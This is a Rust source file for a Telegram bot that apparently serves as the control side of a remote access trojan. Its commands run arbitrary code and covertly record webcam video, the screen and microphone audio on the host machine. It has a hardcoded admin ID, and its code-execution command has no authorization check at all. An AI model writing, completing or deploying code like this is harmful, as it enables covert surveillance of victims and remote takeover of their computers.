use teloxide::{prelude::*, types::MessageKind, utils::command::BotCommands};
use std::sync::{Arc, Mutex};
use token_manager::TokenManager;
use admin_manager::AdminManager;
use handlers::{code_execution, video_record, audio_record, screen_record};

mod token_manager;
mod admin_manager;
mod handlers;

#[tokio::main]
async fn main() {
    let token = TokenManager::get_token();
    let bot = Bot::new(token).auto_send();

    let admin_manager = Arc::new(Mutex::new(AdminManager::new(vec![7660492768])));

    teloxide::commands_repl(bot, admin_manager, "Bot", answer).await;
}

#[derive(BotCommands)]
#[command(rename_rule = "lowercase", description = "Available commands:")]
enum Command {
    #[command(description = "Execute code: >code")]
    Ex(String),
    #[command(description = "Record video for n seconds: vid.x<seconds>")]
    Vid(String),
    #[command(description = "Record screen for n seconds: scn.x<seconds>")]
    Scn(String),
    #[command(description = "Record audio for n seconds: aud.x<seconds>")]
    Aud(String),
    #[command(description = "Set user as admin (admin only): secusr:<token>")]
    Secusr(String),
    #[command(description = "Help")]
    Help,
}

async fn answer(
    bot: AutoSend<Bot>, 
    admin_manager: Arc<Mutex<AdminManager>>, 
    message: Message, 
    command: Command
) -> ResponseResult<()> {
    let user_id = message.from().map(|u| u.id).unwrap_or_default();
    match command {
        Command::Ex(code) => code_execution::handle(bot, message, code).await,
        Command::Vid(duration) => {
            if admin_manager.lock().unwrap().is_admin(user_id) {
                video_record::handle(bot, message, duration).await
            } else {
                log_unauthorized_attempt(&bot, &message).await;
                bot.send_message(message.chat.id, "Unauthorized").await?;
                Ok(())
            }
        }
        Command::Scn(duration) => {
            if admin_manager.lock().unwrap().is_admin(user_id) {
                screen_record::handle(bot, message, duration).await
            } else {
                log_unauthorized_attempt(&bot, &message).await;
                bot.send_message(message.chat.id, "Unauthorized").await?;
                Ok(())
            }
        }
        Command::Aud(duration) => {
            if admin_manager.lock().unwrap().is_admin(user_id) {
                audio_record::handle(bot, message, duration).await
            } else {
                log_unauthorized_attempt(&bot, &message).await;
                bot.send_message(message.chat.id, "Unauthorized").await?;
                Ok(())
            }
        }
        Command::Secusr(token) => {
            let is_admin = admin_manager
                .lock()
                .unwrap()
                .validate_token_and_add_admin(user_id, &token);
            if is_admin {
                bot.send_message(message.chat.id, "You are now an admin.").await?;
            } else {
                bot.send_message(message.chat.id, "Invalid token.").await?;
            }
            Ok(())
        }
        Command::Help => {
            bot.send_message(message.chat.id, Command::descriptions().to_string())
                .await?;
            Ok(())
        }
    }
}

async fn log_unauthorized_attempt(bot: &AutoSend<Bot>, message: &Message) {
    if let Some(user) = message.from() {
        eprintln!(
            "Unauthorized attempt by user {} ({})",
            user.username.as_deref().unwrap_or("unknown"),
            user.id
        );
    }
}
